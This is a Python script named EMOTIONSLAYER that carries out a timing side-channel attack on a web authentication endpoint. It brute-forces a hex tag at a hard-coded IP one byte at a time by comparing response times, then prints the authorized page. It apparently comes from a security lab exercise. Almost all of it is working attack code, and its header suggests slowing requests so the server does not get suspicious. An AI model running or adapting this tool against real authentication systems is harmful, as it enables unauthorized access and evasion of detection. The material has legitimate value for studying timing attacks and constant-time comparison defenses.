import urllib2
import time
from requests.exceptions import HTTPError
import timeit
import requests
import constant
import sys
###################################################EMOTIONSLAYER.PY#######################################################
#This is an automated tool to crack a hex tag on a specific webpage. Customize your username, etc. in the constant.py file
#
#For future development: consider adding some timeout between each request so the server doesn't get suspicious. This will
#of course cause longer waiting time but might be worth it, at least make it an optionable feature.
###################################################EMOTIONSLAYER.PY#######################################################

def toHex(tag):
	temp = []
	for item in tag:
		temp.append(hex(item)[2:])
	str1 = ''.join(temp)
	return str1


def sampleTime(tag):
	timeArray = [0] * constant.NUMBER_OF_TESTS
	for x in range (constant.NUMBER_OF_TESTS):
		try:
			timeArray[x] = requests.get("http://130.243.27.198/auth/" + str(constant.TIMEOUT) + "/" + constant.USERNAME + "/" + toHex(tag)).elapsed.total_seconds()
		except:
			print constant.ERROR + "[ERROR]Unable to connect to server" + constant.ENDC
	return min(timeArray)
	
def verifyBits(tag,pos, meanTime, longest, prevTime):
	verified = 0
	connectionTimes = [0.0] * ((constant.LENGTH_OF_TAG/2) + 1)
	connectionTimes[pos/2] = longest
	if connectionTimes[pos/2] > (prevTime + float(constant.TIMEOUT)/1000):
		verified = 1
	elif connectionTimes[pos/2] < (prevTime/2):
		print constant.WARNING + "[!]Re-testing preceeding bit" + constant.ENDC
		verified = -1
	return verified
	
def increaseTag(tag, pos):
	tag[pos + 1] += 1
	if tag[pos + 1] > 15:
		tag[pos] += 1
		tag[pos + 1] = 0
	return tag


def tryTag(tag, pos, meanTime):
	timeArray = [0] * constant.NUMBER_OF_TESTS
	longest = [0.0] * 3
	prevTime = meanTime
	verified = 0
	counter = 0
	sameBit = 0
	prevBit = [-1] * 2
	while pos <= (constant.LENGTH_OF_TAG - 2):
		for x in range (constant.NUMBER_OF_TESTS):
			timeArray[x] = requests.get("http://130.243.27.198/auth/"+ str(constant.TIMEOUT) + "/" + constant.USERNAME + "/" + toHex(tag)).elapsed.total_seconds()
		if constant.BE_VERBOSE:
			print tag
		if min(timeArray) > longest[0]:
			longest[0] = min(timeArray)
			longest[1] = tag[pos]
			longest[2] = tag[pos + 1]
		tag = increaseTag(tag, pos)
		if tag[pos] > 15:
			tag[pos] = longest[1]
			tag[pos + 1] = longest[2]
			verified = verifyBits(tag,pos,meanTime,longest[0], prevTime)
			if verified == 1 or sameBit > 2:
				if sameBit > 2:
					print constant.OKBLUE + "[#]The same bit keeps appearing. Assuming it's the right one" + constant.ENDC
				if constant.BE_VERBOSE:
					print "[#]Current tag: " + str(toHex(tag) + " Delta: " + str((longest[0] - prevTime) * 1000) + " ms")
				elif constant.BE_VERBOSE == False:
					print "[#]Current tag: " + str(toHex(tag))
				pos += 2
				prevTime = longest[0]
				longest[0] = 0.0
				counter = 0
				sameBit = 0
			elif verified == -1 or counter > 5:
				tag[pos] = 0
				tag[pos+1] = 0
				pos -= 2
				tag[pos] = 0
				tag[pos+1] = 0
			elif verified == 0 and counter <= 5:
				if counter == 0:
					prevBit[0] = tag[pos]
					prevBit[1] = tag[pos + 1]
				if counter > 0 and prevBit[0] == tag[pos] and prevBit[1] == tag[pos+1]:
					sameBit += 1
				elif counter > 0 and prevBit[0] != tag[pos] or prevBit[1] != tag[pos+1]:
					sameBit = 0
				print constant.WARNING + "[!]Re-testing current bit for the " + str(counter) + " time" + constant.ENDC
				tag[pos] = 0
				tag[pos + 1] = 0
				counter += 1		
	return tag

authorized = False
counter = 0
previousTag = [0] * constant.LENGTH_OF_TAG
currentTag = [0] * constant.LENGTH_OF_TAG #Create a tag containing all 0
pos = 0
start = time.time()
while authorized == False:
	meanTime = sampleTime(currentTag) #Calculate mean time for server parsing on currentTag
	currentTag = tryTag(currentTag, pos, meanTime) #Find the correct tag!
	pos = 0
	try:
		contents = urllib2.urlopen("http://130.243.27.198/auth/" + str(constant.TIMEOUT) + "/" + constant.USERNAME + "/" + toHex(currentTag)).read()
		print constant.OKGREEN + contents + constant.ENDC
		print constant.OKGREEN + "[#] Complete link: http://130.243.27.198/auth/" + str(constant.TIMEOUT) + "/" + constant.USERNAME + "/" + str(toHex(currentTag)) + constant.ENDC
		stop = time.time()
		print "[#]Elapsed time: " + str(stop - start) + " sec"
		print "[#]Elapsed time: " + str(int(stop - start)/60) + " min " + str(int(stop - start)%60) + " sec"
		authorized = True
	except urllib2.HTTPError as error:
		if error.code == 401:
			print constant.FAIL + error
			print constant.FAIL +  '[ERROR]Wrong tag! Starting over...' + constant.ENDC
			if counter == 0:
				previousTag = currentTag
			if counter > 0:	
				for x in range(constant.LENGTH_OF_TAG):
					if previousTag[x] == currentTag[x]:
						pos += 1
						currentTag = previousTag
			counter += 1

